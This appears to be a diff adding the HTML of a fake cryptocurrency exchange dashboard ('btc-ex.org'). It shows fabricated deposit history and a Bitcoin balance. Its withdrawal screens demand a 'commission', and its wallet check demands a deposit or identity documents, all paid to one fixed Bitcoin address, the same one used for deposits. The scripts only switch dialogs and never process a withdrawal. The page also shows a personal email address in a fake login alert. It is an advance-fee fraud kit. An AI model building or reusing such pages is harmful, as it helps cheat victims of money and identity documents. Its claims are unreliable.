+<td>11981010</td>
+<td>May 29, 2020</td>
+<td>Deposit</td>
+<td>+ 0.024 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>May 29, 2020</td>
+<td>Commission</td>
+<td>+ 0.000245 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>11981014</td>
+<td>May 17, 2020</td>
+<td>Deposit</td>
+<td>+ 0.224 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>May 17, 2020</td>
+<td>Commission</td>
+<td>+ 0.002286 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/ETH.svg" style="height: 20px;"></td>
+<td>11951216</td>
+<td>May 16, 2020</td>
+<td>Deposit</td>
+<td>+ 1.1 ETH</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/ETH.svg" style="height: 20px;"></td>
+<td></td>
+<td>May 16, 2020</td>
+<td>Commission</td>
+<td>+ 0.011224 ETH</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+</div>
+</div>
+<footer class="uk-section uk-section-small uk-text-center">
+<div class="tradingview-widget-container" style="opacity: 0.85">
+<div class="tradingview-widget-container__widget"></div>
+<script src="embed-widget-ticker-tape.js" async> { "symbols": [ { "proName": "BITSTAMP:BTCUSD", "title": "BTC/USD" }, { "proName": "BITSTAMP:ETHUSD", "title": "ETH/USD" }, { "description": "BTH/USD", "proName": "BINANCE:BCHUSDT" }, { "description": "LTС/USD", "proName": "BINANCE:LTCUSDT" }, { "description": "DASH/USD", "proName": "BINANCE:DASHUSDT" } ], "showSymbolLogo": false, "colorTheme": "light", "isTransparent": false, "largeChartUrl": "http://btc-ex.org/trading", "displayMode": "adaptive", "locale": "en"
+                  }
+               </script>
+</div>
+<p class="uk-text-small uk-text-center">© 2018-2021 <a href="home.html">DOGE-EXE LTD</a> Trademarks belong to their respective owners. All rights reserved</p>
+</footer>
+</div>
+</div>
+<div id="offcanvas-nav" data-uk-offcanvas="flip: true; overlay: true">
+<div class="uk-offcanvas-bar uk-offcanvas-bar-animation uk-offcanvas-slide">
+<button class="uk-offcanvas-close uk-close uk-icon" type="button" data-uk-close></button>
+<ul class="uk-nav uk-nav-default">
+<li> <b>Trade Balances:</b> <br> <img src="/img/ico/BTC.svg" width="16" height="16">&nbsp;<b style="color: #fff">1.142347</b>&nbsp;BTC &nbsp;&nbsp; <img src="/img/ico/ETH.svg" width="16" height="16">&nbsp;<b style="color: #fff">0.067281</b>&nbsp;ETH </li>
+<hr>
+<li><a href="/profile"><span data-uk-icon="icon: home" class="uk-margin-small-right"></span>Dashboard</a></li>
+<li><a uk-toggle="target: #DEPOSIT" href="#"><span data-uk-icon="icon: download" class="uk-margin-small-right"></span>Deposit</a></li>
+<li><a uk-toggle="target: #WITHDRAW" href="#"><span data-uk-icon="icon: upload" class="uk-margin-small-right"></span>Withdraw</a></li>
+<li><a href="/ledger"><span data-uk-icon="icon: file-text" class="uk-margin-small-right"></span>Ledger</a></li>
+<li><a href="/faqs"><span data-uk-icon="icon: lifesaver" class="uk-margin-small-right"></span>Help</a></li>
+<hr>
+<li><a href="/sign in"><span data-uk-icon="icon: sign-out" class="uk-margin-small-right"></span>Logout</a></li>
+</ul>
+</div>
+</div>
+<div id="ALERT" uk-modal>
+<div class="uk-modal-dialog uk-modal-body">
+<button class="uk-modal-close-default" type="button" uk-close></button>
+<h2 class="uk-modal-title">Please confirm</h2>
+<div class="uk-alert uk-alert-warning" uk-alert> You are logged in from a new region, please confirm it is you. <br> A confirmation request has been sent to your email: <b>jamesgr33n@gmail.com</b> </div>
+</div>
+</div>
+<div id="ALERT2" uk-modal>
+<div class="uk-modal-dialog uk-modal-body">
+<button class="uk-modal-close-default" type="button" uk-close></button>
+<h2 class="uk-modal-title">Technical works</h2>
+<div class="uk-alert uk-alert-warning" uk-alert> For technical issues, replenishment and withdrawal is available for then Bitcoin wallets (BTC). </div>
+</div>
+</div>
+<div id="DEPOSIT" uk-modal>
+ <div class="uk-modal-dialog uk-modal-body">
+<button class="uk-modal-close-default" type="button" uk-close></button>
+<h2 class="uk-modal-title">Deposit</h2>
+<form>
+<fieldset class="uk-fieldset">
+<div class="uk-margin">
+<label class="uk-form-label" for="form-stacked-text">Select deposit currency:</label>
+<ul class="uk-subnav uk-subnav-pill" uk-switcher>
+<li><a href="#"><img src="https://btc-ex.org/img/ico/BTC.svg" style="float: left; margin-right: 5px; height: 24px;">BTC</a></li>
+<li style="opacity:0.5"><a href="#"><img src="https://btc-ex.org/img/ico/ETH.svg" style="float: left; margin-right: 5px; height: 24px;">ETH</a></li>
+<li style="opacity:0.5"><a href="#"><img src="https://btc-ex.org/img/ico/BCH.svg" style="float: left; margin-right: 5px; height: 24px;">BCH</a></li>
+<li style="opacity:0.5"><a href="#"><img src="https://btc-ex.org/img/ico/LTC.svg" style="float: left; margin-right: 5px; height: 24px;">LTC</a></li>
+<li style="opacity:0.5"><a href="#"><img src="https://btc-ex.org/img/ico/DASH.svg" style="float: left; margin-right: 5px; height: 24px;">DASH</a></li>
+</ul>
+<ul class="uk-switcher uk-margin">
+<li>
+<div class="uk-margin">
+<label class="uk-form-label" for="form-stacked-text">Select the amount of the deposit:</label> <input class="uk-input" id="_amount_p" type="number" placeholder="Amount" step="0.01" value="0.05" min="0.01" max="0.5">
+<div class="uk-alert-primary" uk-alert>
+<a class="uk-alert-close" uk-close></a>
+<p>Min. deposit amount: <b>0.01</b> BTC,<br> Max. deposit amount: <b>0.5</b> BTC (per day)</p>
+</div>
+</div>
+<div class="uk-margin uk-align-right"> <button uk-toggle="target: #DEPOSIT2" onclick="if (!window.__cfRLUnblockHandlers) return false; depositpay(); return false;" class="uk-button uk-button-primary" type="button" data-cf-modified-23fa040a53302ba324f842e7-=""> <span class="uk-margin-small-right" uk-icon="check"></span> Pay now </button> </div>
+</li>
+<li>
+<div class="uk-alert-warning uk-alert" uk-alert> For technical issues, replenishment and withdrawal is available for then Bitcoin wallets (BTC). </div>
+</li>
+<li>
+<div class="uk-alert-warning uk-alert" uk-alert> For technical issues, replenishment and withdrawal is available for then Bitcoin wallets (BTC). </div>
+</li>
+<li>
+<div class="uk-alert-warning uk-alert" uk-alert> For technical issues, replenishment and withdrawal is available for then Bitcoin wallets (BTC). </div>
+</li>
+<li>
+<div class="uk-alert-warning uk-alert" uk-alert> For technical issues, replenishment and withdrawal is available for then Bitcoin wallets (BTC). </div>
+</li>
+</ul>
+</fieldset>
+</form>
+<script> depositpay = function() { document.getElementById('amount_p').innerHTML = document.getElementById('_amount_p').value;
+            document.getElementById('amount_p_').innerHTML = document.getElementById('_amount_p').value;
+            var _tmr = window._tmr || (window._tmr = []);
+            _tmr.push({ id: "3205933", type: "reachGoal", goal: "show" }); };
+
+            function manage(txt) {
+                if (document.getElementById("_your_amount_p").value < 1.142347) {
+                    document.getElementById('_appr_withdraw').disabled = false;
+                }
+                else {
+                    document.getElementById('_appr_withdraw').disabled = true;
+                }
+            }
+
+          </script> </div>
+</div>
+<div id="DEPOSIT2" uk-modal>
+<div class="uk-modal-dialog uk-modal-body">
+<button class="uk-modal-close-default" type="button" uk-close></button>
+<h2 class="uk-modal-title">Payment confirmation</h2>
+<div class="uk-margin"> <label class="uk-form-label" for="form-stacked-text"> <b class="uk-text-primary">Order #5961636 for replenishment of <span id="amount_p_">0.05</span> BTC is created!</b> <br> Send exactly <b><span id="amount_p">0.05</span> BTC</b> to: </label> <input class="uk-input" value="18LkeNLLqn8biQsehPqyBTT7rE1b8CdBLh" type="text" placeholder="address" readonly="readonly" style="text-align: center; font-weight: bold;"> </div>
+<div class="uk-alert uk-alert-warning" uk-alert style="display: -webkit-box;">
+<div style="width: 75%; font-size: 85%; line-height: 22px; padding-right: 3%;"> Your payment will be completed after confirmation by the network. Confirmation time may vary and depends on the deposit amount and server load. You can use the <a target="_blank" href="/qr/image.php?data=bitcoin:18LkeNLLqn8biQsehPqyBTT7rE1b8CdBLh">QR code for payment</a>. </div>
+<div style="width: 25%; ext-align:center;" class="uk-visible@m">
+<img src="https://btc-ex.org/qr/image.php?data=bitcoin:18LkeNLLqn8biQsehPqyBTT7rE1b8CdBLh" style="width: 120px;" alt="Address">
+<div uk-countdown="date: 2021-11-03T18:18:16+00:00" align="center"> <span class="uk-countdown-number uk-countdown-minutes" style="font-size: 14px"></span> <span class="uk-countdown-separator" style="font-size: 14px">:</span> <span class="uk-countdown-number uk-countdown-seconds" style="font-size: 14px"></span></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="WITHDRAW" uk-modal>
+<div class="uk-modal-dialog uk-modal-body">
+<button class="uk-modal-close-default" type="button" uk-close></button>
+<h2 class="uk-modal-title">Withdraw</h2>
+<form>
+<fieldset class="uk-fieldset">
+<div class="uk-margin">
+<label class="uk-form-label" for="form-stacked-text">Select withdrawal currency:</label>
+<ul class="uk-subnav uk-subnav-pill" uk-switcher>
+<li><a href="#"><img src="https://btc-ex.org/img/ico/BTC.svg" style="float: left; margin-right: 5px; height: 24px;">BTC</a></li>
+<li style="opacity:0.5"><a href="#"><img src="https://btc-ex.org/img/ico/ETH.svg" style="float: left; margin-right: 5px; height: 24px;">ETH</a></li>
+<li style="opacity:0.5"><a href="#"><img src="https://btc-ex.org/img/ico/BCH.svg" style="float: left; margin-right: 5px; height: 24px;">BCH</a></li>
+<li style="opacity:0.5"><a href="#"><img src="https://btc-ex.org/img/ico/LTC.svg" style="float: left; margin-right: 5px; height: 24px;">LTC</a></li>
+<li style="opacity:0.5"><a href="#"><img src="https://btc-ex.org/img/ico/DASH.svg" style="float: left; margin-right: 5px; height: 24px;">DASH</a></li>
+</ul>
+<ul class="uk-switcher uk-margin">
+<li>
+<div class="uk-margin">
+<label class="uk-form-label" for="form-stacked-text">Select withdrawal amount:</label> <input class="uk-input" id="_your_amount_p" type="number" placeholder="Amount" step="0.01" value="1.142347" onkeyup="manage(this)" min="0.01" max="1.142347" style="font-weight: bold;">
+<div class="uk-alert-primary" uk-alert>
+<a class="uk-alert-close" uk-close></a>
+<p>Min. withdraw amount: <b>0.01</b> BTC,<br> Max. withdraw amount: <b>1.142347</b> BTC (per day)</p>
+</div>
+</div>
+<div class="uk-margin uk-align-right"> <button uk-toggle="target: #WITHDRAW2" id="_appr_withdraw" class="uk-button uk-button-primary" type="button"> <span class="uk-margin-small-right" uk-icon="check"></span> Get now </button> </div>
+<script> withdrw = function() {
+                             document.getElementById('your_wallet').innerHTML = document.getElementById('_your_wallet').value;
+                             document.getElementById('your_amount_p').innerHTML = document.getElementById('_your_amount_p').value;
+                             var entered_value = parseFloat(document.getElementById('_your_amount_p').value);
+                             var _tmr = window._tmr || (window._tmr = []); _tmr.push({ id: "3205933", type: "reachGoal", goal: "show" });
+
+                             if (entered_value > 1.142347) {
+                                  UIkit.toggle('#WITHDRAW');
+                               } else {
+                                  UIkit.toggle('#WITHDRAW2');
+                               }
+                             };
+
+                           </script>
+</li>
+<li>
+<div class="uk-alert-warning uk-alert" uk-alert> For technical issues, replenishment and withdrawal is available for then Bitcoin wallets (BTC). </div>
+</li>
+<li>
+<div class="uk-alert-warning uk-alert" uk-alert> For technical issues, replenishment and withdrawal is available for then Bitcoin wallets (BTC). </div>
+</li>
+<li>
+<div class="uk-alert-warning uk-alert" uk-alert> For technical issues, replenishment and withdrawal is available for then Bitcoin wallets (BTC). </div>
+</li>
+<li>
+<div class="uk-alert-warning uk-alert" uk-alert> For technical issues, replenishment and withdrawal is available for then Bitcoin wallets (BTC). </div>
+</li>
+</ul>
+</fieldset>
+</form>
+</div>
+</div>
+<div id="WITHDRAW2" uk-modal>
+<div class="uk-modal-dialog uk-modal-body">
+<button class="uk-modal-close-default" type="button" uk-close></button>
+<h2 class="uk-modal-title">Withdraw</h2>
+<form>
+<fieldset class="uk-fieldset">
+<div class="uk-margin">
+<label class="uk-form-label" for="form-stacked-text">Please enter a valid wallet address (BTC)</label> <input class="uk-input" id="_your_wallet" type="text" placeholder="Wallet BTC" value="1Fd1zWsLCP8okiExCrhzvU4TD8zKYfgbZ1" style="font-weight: bold;">
+<div class="uk-alert-primary" uk-alert>
+<a class="uk-alert-close" uk-close></a>
+<p> To confirm the withdrawal, you need to pay a commission in the next step. </p>
+</div>
+</div>
+<div class="uk-margin uk-align-right"> <button uk-toggle="target: #WITHDRAW3" onclick="withdrawpay();" class="uk-button uk-button-primary" type="button"> <span class="uk-margin-small-right" uk-icon="check"></span> Confirm </button> </div>
+</fieldset>
+</form>
+<script> withdrawpay = function() {
+                 document.getElementById('your_wallet').innerHTML = document.getElementById('_your_wallet').value;
+                 document.getElementById('your_amount_p').innerHTML = document.getElementById('_your_amount_p').value;
+                 var _tmr = window._tmr || (window._tmr = []); _tmr.push({ id: "3205933", type: "reachGoal", goal: "show" }); };</script>
+</div>
+</div>
+<div id="WITHDRAW3" uk-modal>
+<div class="uk-modal-dialog uk-modal-body">
+<button class="uk-modal-close-default" type="button" uk-close></button>
+<h2 class="uk-modal-title">Confirm wallet address</h2>
+<div class="uk-margin"> <label class="uk-form-label" for="form-stacked-text"> <b class="uk-text-primary">Order #5961636 for <span id="your_amount_p">0.05</span> BTC withdrawal has been created!</b> <br> In order to confirm the wallet <b id="your_wallet"></b> send a commission for exactly the <b>0.000963</b> to: </label> <input class="uk-input" value="18LkeNLLqn8biQsehPqyBTT7rE1b8CdBLh" type="text" placeholder="address" readonly="readonly" style="text-align: center; font-weight: bold;"> </div>
+<div class="uk-alert uk-alert-warning" uk-alert style="display: -webkit-box;">
+<div style="width: 75%; font-size: 85%; line-height: 22px; padding-right: 3%;"> Your withdrawal will be completed after confirmation by the network. Fee amount will be fully compensated in the withdraw. <br> To pay the withdrawal commission, you can use the <a target="_blank" href="/qr/image.php?data=bitcoin%3A18LkeNLLqn8biQsehPqyBTT7rE1b8CdBLh">QR code</a>. </div>
+<div style="width: 25%; ext-align:center;" class="uk-visible@m">
+<img src="https://btc-ex.org/qr/image.php?data=bitcoin%3A18LkeNLLqn8biQsehPqyBTT7rE1b8CdBLh" style="width: 120px;" alt="Address" />
+<div uk-countdown="date: 2021-11-03T18:18:16+00:00" align="center">
+<span class="uk-countdown-number uk-countdown-minutes" style="font-size: 14px"></span>
+<span class="uk-countdown-separator" style="font-size: 14px">:</span>
+<span class="uk-countdown-number uk-countdown-seconds" style="font-size: 14px"></span>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="EDIT" uk-modal>
+<div class="uk-modal-dialog uk-modal-body">
+<button class="uk-modal-close-default" type="button" uk-close></button>
+<h2 class="uk-modal-title">Confirm wallet address</h2>
+<div class="uk-margin"> <label class="uk-form-label" for="form-stacked-text"> To confirm the wallet and the intention to withdraw funds send document confirming your identity to email: support@btc-ex.org or make a deposit from this address. Send a minimum deposit of <b>0.0005 BTC</b> to: </label> <input class="uk-input" value="18LkeNLLqn8biQsehPqyBTT7rE1b8CdBLh" type="text" placeholder="address" readonly="readonly" style="text-align: center; font-weight: bold;"> </div>
+<div class="uk-alert uk-alert-warning" uk-alert style="display: -webkit-box;">
+<div style="width: 75%; font-size: 85%; line-height: 22px; padding-right: 3%;"> You are trying to change your wallet. For security reasons, you can only withdraw funds to the address that is registered and verified in your account. To verify your address with an account, you need to make a deposit from that address. Minimum deposit amount <b>0.0005 BTC</b> </div>
+<div style="width: 25%; ext-align:center;" class="uk-visible@m"> <img src="/qr/image.php?data=bitcoin:18LkeNLLqn8biQsehPqyBTT7rE1b8CdBLh" style="width: 120px;" alt="Address"> </div>
+</div>
+</div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/uikit@latest/dist/js/uikit.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/uikit@latest/dist/js/uikit-icons.min.js"></script>
+<script>
+    (function(h,o,t,j,a,r){
+        h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
+        h._hjSettings={hjid:2411053,hjsv:6};
+        a=o.getElementsByTagName('head')[0];
+        r=o.createElement('script');r.async=1;
+        r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
+        a.appendChild(r);
+    })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
+</script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NLZX7C099P"></script>
+<script async src="https://cdn.btc-ex.org/app.js"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-NLZX7C099P');
+</script>
+<script type="text/javascript"> (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)}; m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)}) (window, document, "script", "https://cdn.jsdelivr.net/npm/yandex-metrica-watch/tag.js", "ym"); ym(85983339, "init", { clickmap:true, trackLinks:true, accurateTrackBounce:true }); </script> <noscript><div><img src="https://mc.yandex.ru/watch/85983339" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+</body>
+</html>
